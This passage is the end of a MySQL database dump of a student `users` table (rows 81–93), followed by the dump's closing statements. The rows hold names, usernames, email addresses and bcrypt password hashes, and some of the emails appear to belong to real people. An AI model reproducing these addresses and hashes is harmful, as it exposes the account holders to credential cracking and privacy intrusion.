06:34:56','2025-11-17 06:34:56',0),(81,'siswa 81','siswa81','aisarah81@gmail.com',NULL,'$2y$12$TTDnJbm3dfbVV5OlSErEF.OcqIdacYfdWrtR8vY58sTynF48YGI/i','siswa',NULL,'2025-11-17 06:34:57','2025-11-17 06:34:57',0),(82,'siswa 82','siswa82','aisarah82@gmail.com',NULL,'$2y$12$1MhF17oIXnbPVFBSr08Rou8rCWYj4XqnutPSBhv3m3Yqw/Rgjw1pK','siswa',NULL,'2025-11-17 06:34:57','2025-11-17 06:34:57',0),(83,'siswa 83','siswa83','aisarah83@gmail.com',NULL,'$2y$12$rF0tBiztDYs7hhwrTnmQsOLkwwjSKidC.000iN9uR6iUiB2OsvzWC','siswa',NULL,'2025-11-17 06:34:57','2025-11-17 06:34:57',0),(84,'siswa 84','siswa84','aisarah84@gmail.com',NULL,'$2y$12$ya6zJ6ShwNZxTl5LRllzz.3I0heYaByWGbfP6nR6ZfozIrMhlzUqq','siswa',NULL,'2025-11-17 06:34:57','2025-11-17 06:34:57',0),(85,'siswa 85','siswa85','aisarah85@gmail.com',NULL,'$2y$12$QcvsLmQsy91P9PS.94FRyOb9p.JJU3oooCPzD4WEBKqVxYv3IUSEG','siswa',NULL,'2025-11-17 06:34:58','2025-11-17 06:34:58',0),(86,'siswa 86','siswa86','aisarah86@gmail.com',NULL,'$2y$12$FUz15n.H0Su4vM.2pirzS.sUf0aI1/j5SmDKu53KixdvBlHrc3ov.','siswa',NULL,'2025-11-17 06:34:58','2025-11-17 06:34:58',0),(87,'siswa 87','siswa87','aisarah87@gmail.com',NULL,'$2y$12$drNkKELWvYJph/AMrwKUe.QzhXf2dCZi27eHrmMaTQzzhDxNQSAgq','siswa',NULL,'2025-11-17 06:34:58','2025-11-17 14:34:12',1),(88,'siswa 88','siswa88','aisarah88@gmail.com',NULL,'$2y$12$plRY4NWErlGAqYdNMRAR1eE7eXMmCUQCmyvobHDwHcMoKt/QHTxIy','siswa',NULL,'2025-11-17 06:34:59','2025-11-17 06:34:59',0),(89,'siswa 89','siswa89','aisarah89@gmail.com',NULL,'$2y$12$5WfysFtUJL2I5ifWE2vcxuF.PQKBv2XBuD6zkkI7U6QUaYupfK9CW','siswa',NULL,'2025-11-17 06:34:59','2025-11-17 06:34:59',0),(90,'siswa 90','siswa90','aisarah90@gmail.com',NULL,'$2y$12$lnm0tk7a9nbqRUUXRk0k0eP/6pD75YE1xgeGPg4sKnTcSBjbIutSO','siswa',NULL,'2025-11-17 06:34:59','2025-11-17 06:34:59',0),(91,'reyn30','reyn30','hflhusen@gmail.com',NULL,'$2y$12$T.YG.9X9/0jpj8fJMnKL6.Z46r9SLxYoKbQIizckLW6KE.70L57JG','siswa',NULL,'2025-11-17 07:05:52','2025-11-17 07:05:52',0),(92,'afifal','afifal','afifal@gmail.com',NULL,'$2y$12$YTHOO4BqCdJOSZqXAaQ4yuNlwPIWlgcI/r11tyBqzSD5.4/uytQPW','siswa',NULL,'2025-11-17 09:05:43','2025-11-17 09:05:43',0),(93,'rendra','rendra','kelassarah.antivirus771@passinbox.com',NULL,'$2y$12$WnDGdkIDiX4l75bvyIlRau3KBtriQC0VcsXq4Qc.cAlB4dApoOafS','siswa',NULL,'2025-11-17 09:39:25','2025-11-17 09:39:25',0);
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-11-18  1:54:39
